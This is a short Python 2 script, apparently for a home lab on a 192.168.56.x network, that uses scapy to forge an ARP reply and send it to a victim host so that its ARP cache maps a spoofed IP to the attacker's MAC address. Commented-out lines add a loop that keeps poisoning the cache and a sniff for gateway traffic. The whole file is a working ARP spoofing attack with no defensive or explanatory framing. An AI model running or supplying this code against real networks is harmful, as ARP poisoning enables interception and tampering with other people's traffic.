import scapy.all as scapy

# Setting variables
attIP="192.168.56.1"
attMAC="0a:00:27:00:00:00"
vicIP="192.168.56.101"
# vicMAC="08:00:27:59:1b:51"
vicMAC="00:00:00:00:00:00"
dgwIP="192.168.56.103"
dgwMAC="00:19:56:00:00:01"

senderIp = "192.168.56.200"
senderMac = "0a:00:27:00:00:00"
targetIp = "192.168.56.101"
targetMac = "08:00:27:59:1b:51"

# Forge the ARP packet
arpFake = scapy.ARP()
# REVERSE
arpFake.op=2
arpFake.psrc=senderIp
arpFake.pdst=targetIp
arpFake.hwdst=targetMac

# STRAIGHT
# arpFake.op=1
# arpFake.psrc=dgwIP
# arpFake.pdst=vicIP
# arpFake.hwdst=vicMAC

# Send the ARP replies
scapy.send(arpFake)
print "ARP sent"


# While loop to send ARP
# when the cache is not spoofed
# while True:

 # Send the ARP replies
 # scapy.send(arpFake)
 # print "ARP sent"

 # Wait for a ARP replies from the default GW
 # scapy.sniff(filter="arp and host 10.0.0.1", count=1)